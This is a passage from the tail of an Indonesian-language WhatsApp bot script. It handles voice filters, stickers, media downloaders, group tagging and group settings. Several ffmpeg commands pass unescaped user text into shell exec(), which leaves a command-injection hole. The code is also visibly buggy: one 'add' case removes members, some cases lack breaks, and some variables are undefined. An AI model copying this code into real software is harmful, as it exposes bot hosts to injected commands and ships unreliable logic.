 reply(mess.wait)
encmedia = JSON.parse(JSON.stringify(vnz).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media = await vanz.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter_complex "vibrato=f=${q}" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
res = fs.readFileSync(ran)
sendPTT(res)
fs.unlinkSync(ran)
})
break
case 'trigger':
 reply(mess.wait)
encmedia = JSON.parse(JSON.stringify(vnz).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media = await vanz.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter_complex "acrusher=level_in=8:level_out=18:bits=8:mode=log:aa=1" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
res = fs.readFileSync(ran)
sendPTT(res)
fs.unlinkSync(ran)
})
break
case 'tempo':
 reply(mess.wait)
 var req = q
encmedia = JSON.parse(JSON.stringify(vnz).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media = await vanz.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter:a "atempo=1.0,asetrate=${req}" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
res = fs.readFileSync(ran)
sendPTT(res)
fs.unlinkSync(ran)
})
break
case 'robot':
 reply(mess.wait)
encmedia = JSON.parse(JSON.stringify(vnz).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media = await vanz.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter_complex "afftfilt=real='hypot(re,im)*sin(0)':imag='hypot(re,im)*cos(0)':win_size=512:overlap=0.75" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
res = fs.readFileSync(ran)
sendPTT(res)
fs.unlinkSync(ran)
})
break

case 'sendlok': case 'sendlokasi':
 reply(mess.wait)
ppp = `${q}`
send = ppp.split("|")[0];
lok = ppp.split("|")[1];
vanz.sendMessage(from, {degreesLatitude: 24.121231, degreesLongitude: 55.1121221, name:send,address:lok}, MessageType.location)
break
case 'google': case 'googlesearch': case 'ggs':
 reply(mess.wait)
if (args.length < 1) return reply('Yang mau di cari apaan?')
teks = q
reply(mess.wait)
uh = await ggs({'query' : `${teks}`})
ggs = ``
for (let i of uh) {
ggs += `GOOOGE SEARCH*
Judul :* ${i.title}
Link :* ${i.link}
Keterangan :* ${i.snippet}
`
}
res = ggs.trim()
reply(res)
break
case 'kontag': case 'kontaktag':
 reply(mess.wait)
pel = q
adn = pel.split("|")[0]
nuhh = pel.split("|")[1]
tot = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + adn + '\n' + 'ORG:Kontak\n' + 'TEL;type=CELL;type=VOICE;waid=' + nuhh + ':+' + nuhh + '\n' + 'END:VCARD'
let tah = await vanz.groupMetadata(from)
let setn = tah.participants
let bru = []
for (let go of setn){
bru.push(go.jid)
}
vanz.sendMessage(from, {displayname: adn, vcard: tot}, MessageType.contact, {contextInfo: {"mentionedJid": bru}})
break
case 'sendkon': case 'kontak':
 reply(mess.wait)
const pepek = q
const adan = pepek.split("|")[0]
const nuahh = pepek.split("|")[1]
const trot = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + adan + '\n' + 'ORG:Kontak\n' + 'TEL;type=CELL;type=VOICE;waid=' + nuahh + ':+' + nuahh + '\n' + 'END:VCARD'
vanz.sendMessage(from, {displayname: adan, vcard: trot}, contact, {quoted:fimg})
break
case 'stag': case 'stctag': case 'sticktag':
if (!isQuotedSticker) return reply(mess.error)
stag = JSON.parse(JSON.stringify(vnz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
tagg = await vanz.downloadMediaMessage(stag)
await fs.writeFileSync(`stctagg.webp`, tagg)
var group = await vanz.groupMetadata(from)
var member = group['participants']
var mem = []
member.map(async adm => {
mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
result = fs.readFileSync(`stctagg.webp`)
vanz.sendSTC(result)
await fs.unlinkSync(`stctagg.webp`)
break
case 'vntag': case 'audiotag':
if (!isQuotedSticker) return reply(mess.error)
tag = JSON.parse(JSON.stringify(vnz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
tagg = await vanz.downloadMediaMessage(tag)
await fs.writeFileSync(`stctagg.webp`, tagg)
var group = await vanz.groupMetadata(from)
var member = group['participants']
var mem = []
member.map(async adm => {
mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
result = fs.readFileSync(`vntag.mp3`)
sendPTT(result)
await fs.unlinkSync(`stctagg.webp`)
break
case 'imgtag': case 'imagetag':
if ((isMedia && !vnz.message.videoMessage || isQuotedImage) && args.length == 0) {
encmedia = isQuotedImage ? JSON.parse(JSON.stringify(vnz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : vnz
filePath = await vanz.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
var value = args.join(" ")
var group = await vanz.groupMetadata(from)
var member = group['participants']
var mem = []
member.map(async adm => {
mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
var opti = {
contextInfo: { mentionedJid: mem },
quoted: vnz
}
ini_buffer = fs.readFileSync(filePath)
sendIMG(ini_buffer)
fs.unlinkSync(filePath)
} else {
reply(mess.error)
}
break
case 'linkgc':
 reply(mess.wait)
linkgc = await vanz.groupInviteCode(from)
reply(`https://chat.whatsapp.com/${linkgc}`)
break
case 'setthumb':
if (!vnz.key.fromMe) return 
if (!isQuotedImage)
if(!isQuotedSticker)return reply('Reply imagenya blokk!')
fakethumb = JSON.parse(JSON.stringify(vnz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
 downfake = await vanz.downloadMediaMessage(fakethumb)
fs.unlinkSync(`./data/src/thumb/Ivan.jpg`)
fs.writeFileSync(`./data/src/thumb/Ivan.jpg`, downfake)
anu = fs.readFileSync('./data/src/thumb/Ivan.jpg')
reply(mess.sukses)
break
case 'public': case 'publik':
if (!vnz.key.fromMe) return 
 fromMe = true
reply(`「 *PUBLIC-MODE* 」`)
break
case 'self':
if (!vnz.key.fromMe) return 
 fromMe = false
reply('「 *SELF-MODE* 」')
break
case 'emojipng': case 'emojitopng':
 reply(mess.wait)
anu = await dl.emoji(1)
sendFile(q.whatsapp, image)
break
case 'semoji': case 'stikemoji':
 reply(mess.wait)
y = q
emojidl.get(y).then(res => {
png = `${res.images[4].url}`
sendStickUrl(png)
})
break
case 'twitdl': case 'twitter':
 reply(mess.wait)
twitdl(`${q}`)
.then(tewit => {
sendFile(twit.download[2].url, video)
})
break
case 'fbdl': case 'facebook': case 'fb':
 reply(mess.wait)
fbdl.getInfo(`${q}`)
.then(fb => {
sendFile(fb.download.sd, video)
})
break
case 'tt': case 'tiktok':
 reply(mess.wait)
ttvideo = await dl.tiktok(q)
sendFile(ttvideo.result.nowm, video)
break
case 'ttmp3': case 'tiktokmusic':
 reply(mess.wait)
 anu = await dl.tiktokmusic(q)
vanz.sendFile(from, anu.meta.music.playUrl, 'anu.mp3', 'null', m)
break
case 'ig': case 'instagram': case 'igdl':
 reply(mess.wait)
igdl(args[0]).then(async(result) => {
for (let igres of result.url_list){
if (igres.includes('.mp4')){
sendFile(igres, video)
} else if (igres.includes('.jpg')){
vanz.sendFile(from, igres, 'anu.png',null,m)
}
}
})
break
case 'isbaileys': case 'bail': case 'baileys':
reply(`${vnz.quoted.isBaileys}`)
break
case 'getname': 
getnem = vanz.getName(vnz.quoted.sender)
reply(`${getnem}`)
break
case 'tagall': case 'tagmem':
members_id = []
teks = (args.length > 1) ? q.trim() : ''
teks += `TAG ALLL\nPESAN: ${q}\n\n`
for (let mem of groupMembers) {
teks += `@${mem.jid.split('@')[0]}\n`
members_id.push(mem.jid)
}
mentions(teks, members_id, true)
break
case 'hidetag': case 'tag':
if (!vnz.key.fromMe) return
members_id = []
teks = (args.length > 1) ? q.trim() : `${q}`
for (let mem of groupMembers) {
members_id.push(mem.jid)
}
mentions(teks, members_id, true, text)
break
case 'group': case 'grup': case 'gc':
if (args[0] === 'buka') {
reply('Sukses Membuka Group')
vanz.groupSettingChange(from, GroupSettingChange.messageSend, false)
} else if (args[0] === 'tutup') {
await vanz.groupSettingChange(from, GroupSettingChange.messageSend, true)
reply('Sukses Menutup Grup')
}
break
case 'setgcname': case 'gcname':
vanz.groupUpdateDescription(from, `${q}`)
reply(`Sukses Mengubah Nama Gc Menjadi :\n\n${q}`)
break
case 'setgcdesk': case 'gcdesk':
vanz.groupUpdateDescription(from, `${q}`)
reply(`Sukses Mengubah Desk Gc Menjadi :\n\n${q}`)
break
case 'detikvn':
 reply(mess.wait)
encmedia = JSON.parse(JSON.stringify(vnz).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media = await vanz.downloadAndSaveMediaMessage(encmedia)
cokmatane = Number(args[0])
res = fs.readFileSync(media)
sendPTT(from, res)
fs.unlinkSync(media)
break
case 'detikvideo':
 reply(mess.wait)
encmedia = JSON.parse(JSON.stringify(vnz).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media = await vanz.downloadAndSaveMediaMessage(encmedia)
cokmatane = Number(args[0])
res = fs.readFileSync(media)
sendVID(from, res)
fs.unlinkSync(media)
break
case 'getdeskgc': case 'getgcdesk':
mtdt = await vanz.groupMetadata(from)
reply(`${mtdt.desk}`)
break
case 'covid':
 reply(mess.wait)
cvd = await dl.covid()
res = ` *COVID-INDONESIA*

*Kasus:* ${cvd.kasus}
*Sembuh:* ${cvd.sembuh}
*Kematian:* ${cvd.kematian}`
reply(res)
case 'ghstalk':
 reply(mess.wait)
gh = await dl.ghstalk(q)
ghres = `*GITHUB-STALK*

*• Username:* ${gh.login}
*• Nama:* ${gh.name}
*• Lokasi:* ${gh.location}
*• Email:* ${gh.email}
*• Blog:* ${gh.blog}
*• Bio:* ${gh.bui}
*• Followers:* ${gh.followers}
*• Following:* ${gh.following}
*• Repositories:* ${gh.public_repos}`
vanz.sendFile(from, gh.avatar_url, 'anu.png', ghres, m)
case 'getnamagc': case 'getgcnama':
anu = from
metadete = await vanz.groupMetadata(anu)
reply(`${metadete.subject}`)
break
case 'pinterest':
case 'pin':
 reply(mess.wait)
res = await googleImage(q + "Pinterest", google)
function google(result){
gugim = result
pilter = gugim.filter(hamsil => hamsil.url.includes('pinimg')) 
streng = JSON.parse(JSON.stringify(pilter))
random = streng[Math.floor(Math.random() * streng.length)].url
vanz.sendFile(from, random.image, 'anu.png', `Hasil Pencarian Dari:* ${q}`, m)
}
break
case 'googleimage': case 'gimg': case 'image':
reply(mess.wait)
res = await googleImage(q, google)
function google(error, result){
gugim = result
pilter = gugim.filter(hamsil => hamsil.url.includes('pinimg')) 
streng = JSON.parse(JSON.stringify(pilter))
random = streng[Math.floor(Math.random() * streng.length)].url
vanz.sendFile(from, random.image, 'anu.png', `Hasil Pencarian Dari:* ${q}`, m)
}
break
case 'setprefix':
prefix = q
reply(`Berhasil SetPrefix ${q}`)
break
case 'hode':
reply(mess.wait)
encmedia = JSON.parse(JSON.stringify(vnz).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media = await vanz.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} -af atempo=4/3,asetrate=44500*3/4 ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
res = fs.readFileSync(ran)
vanz.sendFile(from, res, 'anu.ptt', null, m)
})
break
case 'antidel':
if (args[0] == '1') {
antidel = true
reply('Sukses Aktifed Anti Delete')
} else if (args[0] == '0') {
antidel = false
reply('Sukses Nonaktifed Anti Delete')
}
break
case 'ulang':
case 'q':
case 'sendquoted':
if (!m.quoted) return reply('Reply pesan!')
let quot = vanz.serializeM(await m.getQuotedObj())
if (!quot.quoted) return reply('Pesan Tidak Mengandung Reply!')
await quot.quoted.copyNForward(m.chat, true)
break
case 'ultah':
reply(mess.wait)
 qq = q

 zodiakk = [
["Capricorn", new Date(1970, 0, 1)],
["Aquarius", new Date(1970, 0, 20)],
["Pisces", new Date(1970, 1, 19)],
["Aries", new Date(1970, 2, 21)],
["Taurus", new Date(1970, 3, 21)],
["Gemini", new Date(1970, 4, 21)],
["Cancer", new Date(1970, 5, 22)],
["Leo", new Date(1970, 6, 23)],
["Virgo", new Date(1970, 7, 23)],
["Libra", new Date(1970, 8, 23)],
["Scorpio", new Date(1970, 9, 23)],
["Sagittarius", new Date(1970, 10, 22)],
["Capricorn", new Date(1970, 11, 22)]
].reverse()

function getZodiac(month, day) {
 dey = new Date(1970, month - 1, day)
return zodiakk.find(([_,_d]) => dey >= _d)[0]
}
 dateek = new Date(qq)
if (dateek == 'Invalid Date') throw dateek
let dd = new Date()
 let [tahun, bulan, tanggal] = [dd.getFullYear(), dd.getMonth() + 1, dd.getDate()]
 birth = [dateek.getFullYear(), dateek.getMonth() + 1, dateek.getDate()]

 zodiackk = getZodiac(birth[1], birth[2])
 ageD = new Date(d - dateek)
 agek = ageD.getFullYear() - new Date(1970, 0, 1).getFullYear()

 birthday = [tahun + (birth[1] < bulan), ...birth.slice(1)]
 cekusia = bulan === birth[1] && tanggal === birth[2] ? `Selamat ulang tahun yang ke-${agek} 🥳` : agek

 tekss = `
Lahir : ${birth.join('-')}
Ultah Mendatang : ${birthday.join('-')}
Usia : ${cekusia}
Zodiak : ${zodiackk}
`.trim()
reply(tekss)
break
case 'runtime':
reply(` • Runtime: ${kyun(uptime)}`)
break
case 'owner':
reply(mess.wait)
vanz.sendContact(from, '628812904283', 'Ivanzz', {quoted: vnz})
break
case 'speed':
reply(`• Speed : ${latensi.toFixed(4)} Second`)
break
case 'uptime':
reply(`• Uptime : ${kyun(os.uptime())}`)
break
case 'inspect':
 reply(mess.wait)
let linkRegex = /chat\.whatsapp\.com\/(?:invite\/)?([0-9A-Za-z]{20,24})/i
let [, code] = q.match(linkRegex) || []
if (!code) throw 'Link invalid'
res = await vanz.query({json: ["query", "invite", code],
expect200: true})
desk = res.desc ? `${res.desc}` : 'Tidak Ada'
caption = `*Group-Link-Inspector*

*• ID:* ${res.id}
*• Nama GC:* ${res.subject}
*• Dibuat Oleh:* @${res.id.split('-')[0]} pada _${formatDate(res.creation * 1000)}_ ${res.subjectOwner}
*• Jumlah Member:* ${res.size}
*• Member Yang Diketahui:* ${res.participants ? '\n' + res.participants.map((user, i) => ++i + '. @' + user.id.split`@`[0]).join('\n').trim() : 'Tidak ada'}
*• Deskripsi:* 
${desk}`

let profilePic = await vanz.getProfilePicture(res.id)
if (profilePic) vanz.sendFile(m.chat, profilePic, 'pp.jpg', caption, m, {contextInfo: {
mentionedJid: vanz.parseMention(caption)
}})
if (!profilePic) m.reply(caption, false, {
contextInfo: {
mentionedJid: vanz.parseMention(caption)
}
})
break
case 'debug':
res = await vanz.prepareMessageFromContent(from,{
"templateMessage": {
"hydratedFourRowTemplate": {
"hydratedContentText": "Hi MyMans APIs 👋,\n\nThank you for your message.\n\nHow can I help you today?",
"hydratedFooterText": "WATI's Chatbot",
"hydratedButtons": [
{
"quickReplyButton": {
"displayText": "Know the Pricing",
"id": "60dd75b0081979507a679f99"
},
"index": 0
},
{
"quickReplyButton": {
"displayText": "Know how WATI works?",
"id": "60dd75b0081979507a679f99"
},
"index": 1
},
{
"quickReplyButton": {
"displayText": "Get Started",
"id": "60dd75b0081979507a679f99"
},
"index": 2
}
]
},
"hydratedTemplate": {
"hydratedContentText": "Hi Ivanzz",
"hydratedFooterText": "Selamat Datang",
"hydratedButtons": [
{
"quickReplyButton": {
"displayText": "Debug",
"id": "60dd75b0081979507a679f99"
},
"index": 0
},
{
"quickReplyButton": {
"displayText": "By",
"id": "60dd75b0081979507a679f99"
},
"index": 1
},
{
"quickReplyButton": {
"displayText": "Ivanzz",
"id": "60dd75b0081979507a679f99"
},
"index": 2
}
]
}
}
}, {quoted:m})
vanz.relayWAMessage(res)
break
case 'debug2':
 res = await vanz.prepareMessageFromContent(from,{
"templateMessage": {
"hydratedFourRowTemplate": {
"hydratedContentText": "Hello,\nSelamat Datang Ivanzz",
"hydratedFooterText": "Debug By Ivanzz",
"hydratedButtons": [
{
"urlButton": {
"displayText": "Join Group Whatsapp Ivanzz",
"url": "https://chat.whatsapp.com/KdA0jvJmgQ49uIIg7NmGVJ"
},
"index": 0
}
]
},
"hydratedTemplate": {
"hydratedContentText": "Hello,\nSelamat Datang Ivanzz",
"hydratedFooterText": "Debug By Ivanzz",
"hydratedButtons": [
{
"urlButton": {
"displayText": "Join Group Whatsapp Ivanzz",
"url": "https://chat.whatsapp.com/KdA0jvJmgQ49uIIg7NmGVJ"
},
"index": 0
}
]
}
}
}, {quoted:m})
vanz.relayWAMessage(res)
break
case 'tahta':
reply(mess.wait)
anu = await dl.tahta(q)
vanz.sendFile(from, anu, 'tahta.png', `Harta Tahta ${q}`, m)
break
case 'styletext': case 'textstyle':
vanz.reply(m.chat, Object.entries(await dl.styleText(q)).map(([name, value]) => `_${name}_ : ${value}`).join`\n\n`, m)
break
case 'asmaulhusna':
anu = await dl.asmaul()
reply(anu)
break
case 'welcome':
 if (!vnz.key.fromMe) return only('Command Khusus Owner !!')
if (Number(args[0]) === 1) {
if (isWelkom) return reply('Welcome Sudah Aktif')
welkom.push(from)
fs.writeFileSync('./data/welkom.json', JSON.stringify(welkom))
reply('Berhasil Mengaktifkan Fitur Welcome')
} else if (Number(args[0]) === 0) {
welkom.splice(from, 1)
fs.writeFileSync('./data/welkom.json', JSON.stringify(welkom))
reply('Berhasil Mematikan Fitur Welcome')
}
break
case 'add':
if (m.quoted) {
anu = vanz.groupRemove(from, [vnz.quoted.participan])
reply(anu)
} else if(vnz.message.extendedTextMessage === undefined || vnz.message.extendedTextMessage === null) {
mentioned = vnz.message.extendedTextMessage.contextInfo.mentionedJid
anu = vanz.groupRemove(from, [mentioned])
reply(anu)
}
break
case 'add':
if (m.quoted) {
anu = vanz.groupAdd(from, [vnz.quoted.participan])
replu(anu)
} else if (vnz.message.extendedTextMessage === undefined || vnz.message.extendedTextMessage === null) {
mentioned = vnz.message.extendedTextMessage.contextInfo.mentionedJid
anu = vanz.groupAdd(from, [mentioned])
reply(anu)
}
case 'toimg':
if (!isQuotedSticker) return reply('Only stickerMessage')
to = await vanz.downloadM(m.quoted)
buf = await Buffer.from(to, 'Buffer')
ran = getRandom('.png')
exec(`ffmpeg -i ${buf} ${ran}`, (err) => {
if (err) return reply(mess.error)
vanz.sendMessage(from, fs.readFileSync(ran), image, { quoted: vnz })
fs.unlinkSync(ran) 
});
break
case 'stiker': 
case 'sticker':
case 's':
if ((isMedia && !vnz.message.videoMessage || isQuotedImage) && args.length == 0) {
let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(vnz).replace('quotedM','m')).message.extendedTextMessage.contextInfo : vnz
let media = await vanz.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.webp')
await ffmpeg(`./${media}`)
.input(media)
.on('start', function (cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
console.log(`Error : ${err}`)
fs.unlinkSync(media)
reply(mess.error)
})
.on('end', function () {
console.log('Finish')
buffer = fs.readFileSync(ran)
vanz.sendMessage(from, buffer, sticker, {quoted: vnz})
fs.unlinkSync(media)
fs.unlinkSync(ran)
})
.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save(ran)
} else if ((isMedia && vnz.message.videoMessage.seconds < 11 || isQuotedVideo && vnz.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
let encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(vnz).replace('quotedM','m')).message.extendedTextMessage.contextInfo : vnz
let media = await vanz.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.webp')
reply(ind.wait())
await ffmpeg(`./${media}`)
.inputFormat(media.split('.')[1])
.on('start', function (cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
console.log(`Error : ${err}`)
fs.unlinkSync(media)
tipe = media.endsWith('.mp4') ? 'video' : 'gif'
reply(mess.error)
})
.on('end', function () {
console.log('Finish')
buffer = fs.readFileSync(ran)
vanz.sendMessage(from, buffer, sticker, {quoted: vnz})
fs.unlinkSync(media)
fs.unlinkSync(ran)
})
.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save(ran)
} else {
reply('undefined')
}
break
default:
}
} catch (e) {
err = String(e)
if (err.includes('startsWith')){ 
return
}
if (err.includes('this.isZero')){
return
}
console.log(color('[ERROR🗿]%s', 'red'), color(e, 'green'))
console.error(e)
}
})
}
starts()
